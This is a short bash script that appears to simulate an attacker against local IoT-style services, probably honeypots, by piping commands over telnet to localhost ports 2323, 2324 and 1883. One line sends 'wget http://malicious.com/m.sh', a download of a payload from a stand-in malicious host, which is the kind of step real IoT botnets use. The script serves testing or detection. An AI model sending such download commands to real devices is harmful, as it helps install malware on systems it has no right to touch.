#!/bin/bash

echo "Simulating multi-device attacker..."

(
  echo "wget http://malicious.com/m.sh"
  sleep 1
) | telnet localhost 2323 >/dev/null 2>&1

(
  echo "show status"
  sleep 1
) | telnet localhost 2324 >/dev/null 2>&1

(
  echo "read"
  sleep 1
) | telnet localhost 1883 >/dev/null 2>&1

echo "Multi-device attack simulated."
